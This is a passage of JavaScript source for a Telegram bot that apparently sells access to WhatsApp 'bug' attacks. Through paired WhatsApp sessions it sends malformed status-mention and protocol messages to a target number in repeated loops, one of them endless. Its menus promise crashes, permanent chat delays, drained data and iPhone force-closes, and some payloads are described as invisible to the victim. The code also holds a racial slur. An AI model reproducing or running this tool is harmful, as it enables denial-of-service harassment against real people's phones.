                                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await sock.relayMessage(
        target,
        {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "Fuck you Lookin at, nigga" },
                    content: undefined
                }
            ]
        }
    );
}

async function ParamsCall(sock, target) {
  for (let i = 0; i < 400; i++) {
      await aviciLoc(target);
      await new Promise((resolve) => setTimeout(resolve, 3500));
      console.log(chalk.red("Send Bug Succes"))
  }
}
async function hard(sock, target) {
  for (let i = 0; i < 300; i++) {
      await VampSuperDelay(target);
      await new Promise((resolve) => setTimeout(resolve, 3500));
      await ZeroXIosFreezeDelay(target);
      await new Promise((resolve) => setTimeout(resolve, 3500));
      console.log(chalk.red("Send Bug Succes"))
  }
}
async function delay(sock, target) {
  while (true) {
      await ZeroXIosFreezeDelay(target);
      await new Promise((resolve) => setTimeout(resolve, 3000));
      await VampSuperDelay(target);
      await new Promise((resolve) => setTimeout(resolve, 3000));
      console.log(chalk.red("Send Bug Succes"))
  }
}
async function pedox(sock, target) {
  for (let i = 0; i < 10; i++) {
      await ZeroXIosFreezeDelay(target);
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await delayMakerInvis(target);
      await new Promise((resolve) => setTimeout(resolve, 3000));
      console.log(chalk.red("Send Bug Succes"))
  }
}
async function crashios(sock, target) {
  for (let i = 0; i < 10; i++) {
      await CrashInvisble(target);
      console.log(chalk.red("Send Bug Succes"))
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}



// ------------ ( Comand Handler ) --------------- \\
const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
  if (shouldIgnoreMessage(msg)) return;

          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://qu.ax/TgfrM.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
          }
          });
          }

  bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
    caption: `\`\`\`
╔═─═⊱ ( RANZ BOT TELE )
┃ Developer : @abee1945
┃ Version : 0.4
┃ Bot name : RANZ BOT
╰═─══─══─══─══─══─═⬡

╔═─═⊱ Information - User
┃ Username : ${username}
┃ UserID : ${senderId}
┃ Premium? : ${premiumStatus}
┃ Runtime : ${runtime}
╰═─══─══─══─══─══─═⬡
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "bugmenu" }]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bugmenu") {
      caption = `
╔═─═⊱ ( RANZ BOT TELE )
┃ Developer : @abee1945
┃ Version : 0.4
┃ Bot name : RANZ BOT
┃ Runtime : ${runtime}
╰═─══─══─══─══─══─═⬡

#- OwnerOnly
▢ /ranzunli 
╰➤ Bug ini akan mengakibatkan target delay chat dan tidak leluasa menggunakan WhatsApp secara permanen meskipun hapus wa, keuntungan bug ini invisible ( tidak terlihat ) dan boros kuota target.
Note : ini bug delay bukan tidak bisa buka wa ( C1 ), Delay chat akan terkirim 10-20 menit !!

#- Recommend
▢ /ranzbull
╰➤ Bug ini akan mengakibatkan target delay chat dan tidak leluasa menggunakan WhatsApp, keuntungan bug ini invisible ( tidak terlihat ) dan boros kuota target.
Note : ini bug delay bukan tidak bisa buka wa ( C1 ), Delay chat akan terkirim 10-20 menit !!

#- Recommend
▢ /ranzcrash
╰➤ Bug ini akan mengakibatkan target crash permanen ( tidak bisa buka wa ) untuk mengatasi bug ini target harus hapus data/wa 
Note : bug ini no invisible ( terlihat ) target akan melihat nomor bot mengirim bug/virus lewat notif

#- iPhoneOnly
▢ /ranzios 628xxx
╰➤ Bug ini akan mengakibatkan iPhone force close ( tidak bisa buka wa ) setiap membuka wa target akan mental/crash.
Note : bug ini no invisible ( terlihat ) target akan melihat nomor bot mengirim bug/virus
`;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "bmenu") {
      caption = `\`\`\`
 𝘽𝙐𝙂 𝘽𝙔 𝙍𝘼𝙉𝙕 👾
──────────────────────────
#- OwnerOnly
▢ /ranzunli 628xxx
╰➤ Bug ini akan mengakibatkan target delay chat dan tidak leluasa menggunakan WhatsApp secara permanen meskipun hapus wa, keuntungan bug ini invisible ( tidak terlihat ) dan boros kuota target.
Note : ini bug delay bukan tidak bisa buka wa ( C1 ), Delay chat akan terkirim 10-20 menit !!

#- Recommend
▢ /ranzbull 628xxx
╰➤ Bug ini akan mengakibatkan target delay chat dan tidak leluasa menggunakan WhatsApp, keuntungan bug ini invisible ( tidak terlihat ) dan boros kuota target.
Note : ini bug delay bukan tidak bisa buka wa ( C1 ), Delay chat akan terkirim 10-20 menit !!

#- Recommend
▢ /ranzcrash 628xxx
╰➤ Bug ini akan mengakibatkan target crash permanen ( tidak bisa buka wa ) untuk mengatasi bug ini target harus hapus data/wa 
Note : bug ini no invisible ( terlihat ) target akan melihat nomor bot mengirim bug/virus lewat notif

#- iPhoneOnly
▢ /ranzios 628xxx
╰➤ Bug ini akan mengakibatkan iPhone force close ( tidak bisa buka wa ) setiap membuka wa target akan mental/crash.
Note : bug ini no invisible ( terlihat ) target akan melihat nomor bot mengirim bug/virus
`;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "owner_mhhhbenu") {
      caption = `\`\`\`
╔═─═⊱ ( 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 )
┃ Developer : 𝐍𝐞𝐩𝐭𝐮𝐧𝐮𝐬𝐗𝐝
┃ Version : 1.0
┃ Bot name : 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘
┃ Language : commonJs
╰═─══─══─══─══─══─═⬡

╔═─═⊱ ( From Neptunus )
┃ Thank you to everyone who
┃ has bought SC 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘, I am 
┃ lucky to have buyers like you.
╰═─══─══─══─══─══─═⬡

╔═─═⊱ ( Owner Only )
┃ /addadmin ID
┃ /deladmin ID
╰═─══─══─══─══─══─═⬡
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `\`\`\`
╔═─═⊱ ( RANZ BOT TELE )
┃ Developer : @abee1945
┃ Version : 0.4
┃ Bot name : RANZ BOT
╰═─══─══─══─══─══─═⬡

╔═─═⊱ Information - User
┃ Username : ${username}
┃ UserID : ${senderId}
┃ Premium? : ${premiumStatus}
┃ Runtime : ${runtime}
╰═─══─══─══─══─══─═⬡
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
        [{ text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "bugmenu" }],
        [{ text: "〢𝐈𝐧𝐟𝐨 𝐁𝐮𝐠", callback_data: "bmenu" }]
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: "https://qu.ax/TgfrM.jpg",
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

// ---------------- ( Case bug Handler ) ----------------------- \\
bot.onText(/\/ranzios (\d+)/, async (msg, match) => {
                  const chatId = msg.chat.id;
                  const senderId = msg.from.id;
                  const targetNumber = match[1];
                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                  const jid = `${formattedNumber}@s.whatsapp.net`;
                  const randomImage = getRandomImage();
                  const userId = msg.from.id;
                  const cooldown = checkCooldown(userId);

           if (shouldIgnoreMessage(msg)) return;
 
           if (cooldown > 0) {
           return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


            
          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
          }
          });
          }

            try {
                if (sessions.size === 0) {
                return bot.sendMessage(
                chatId,
                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
                );
 }
    
            if (cooldown > 0) {
            return bot.sendMessage(chatId, 
            `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
 }
  

           const sentMessage = await bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
           caption: `
\`\`\`
( ☠️ ) -  𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Proses sending bug...


\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crashios(sock, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅

 © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/ranzbull (\d+)/, async (msg, match) => {
                  const chatId = msg.chat.id;
                  const senderId = msg.from.id;
                  const targetNumber = match[1];
                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                  const jid = `${formattedNumber}@s.whatsapp.net`;
                  const randomImage = getRandomImage();
                  const userId = msg.from.id;
                  const cooldown = checkCooldown(userId);

           if (shouldIgnoreMessage(msg)) return;
 
           if (cooldown > 0) {
           return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


            
          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
          }
          });
          }

            try {
                if (sessions.size === 0) {
                return bot.sendMessage(
                chatId,
                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
                );
 }
    
            if (cooldown > 0) {
            return bot.sendMessage(chatId, 
            `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
 }
  

           const sentMessage = await bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
           caption: `
\`\`\`
( ☠️ ) -  𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Proses sending bug...


\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await hard(sock, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅

 © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   
/* 
  (-) Break (-)
*/

bot.onText(/\/ranzcrash (\d+)/, async (msg, match) => {
                  const chatId = msg.chat.id;
                  const senderId = msg.from.id;
                  const targetNumber = match[1];
                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                  const jid = `${formattedNumber}@s.whatsapp.net`;
                  const randomImage = getRandomImage();
                  const userId = msg.from.id;
                  const cooldown = checkCooldown(userId);

           if (shouldIgnoreMessage(msg)) return;
 
           if (cooldown > 0) {
           return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


            
          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
          }
          });
          }

            try {
                if (sessions.size === 0) {
                return bot.sendMessage(
                chatId,
                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
                );
 }
    
            if (cooldown > 0) {
            return bot.sendMessage(chatId, 
            `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
 }
  

           const sentMessage = await bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
           caption: `
\`\`\`
( ☠️ ) -  𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Proses sending bug...


\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await pedox(sock, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅

 © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

/* 
  (-) Break (-)
*/
bot.onText(/\/ranzfc (\d+)/, async (msg, match) => {
                  const chatId = msg.chat.id;
                  const senderId = msg.from.id;
                  const targetNumber = match[1];
                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                  const jid = `${formattedNumber}@s.whatsapp.net`;
                  const randomImage = getRandomImage();
                  const userId = msg.from.id;
                  const cooldown = checkCooldown(userId);


if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Khusus Owner Ranz.");
  }
           if (shouldIgnoreMessage(msg)) return;

            
          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
          }
          });
          }

            try {
                if (sessions.size === 0) {
                return bot.sendMessage(
                chatId,
                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
                );
 }
    
  

           const sentMessage = await bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
           caption: `
\`\`\`
( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅


\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await pedox(sock, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅


\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   



bot.onText(/\/ranzunli (\d+)/, async (msg, match) => {
                  const chatId = msg.chat.id;
                  const senderId = msg.from.id;
                  const targetNumber = match[1];
                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                  const jid = `${formattedNumber}@s.whatsapp.net`;
                  const randomImage = getRandomImage();
                  const userId = msg.from.id;
                  const cooldown = checkCooldown(userId);


if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Khusus Owner Ranz.");
  }
           if (shouldIgnoreMessage(msg)) return;

            
          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
          return bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
          caption: `\`\`\`MISKIN BUY AKSES SANA
Mau akses?
Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
\`\`\`
`,
          parse_mode: "Markdown",
          reply_markup: {
          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
          }
          });
          }

            try {
                if (sessions.size === 0) {
                return bot.sendMessage(
                chatId,
                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
                );
 }
    
  

           const sentMessage = await bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
           caption: `
\`\`\`
( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅


\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delay(sock, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅


\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   




//=======plugins=======//
bot.onText(/^\/onlygrup (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *Only Group* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "Markdown" }
  );
});



bot.onText(/\/addpairing (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - V I P \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});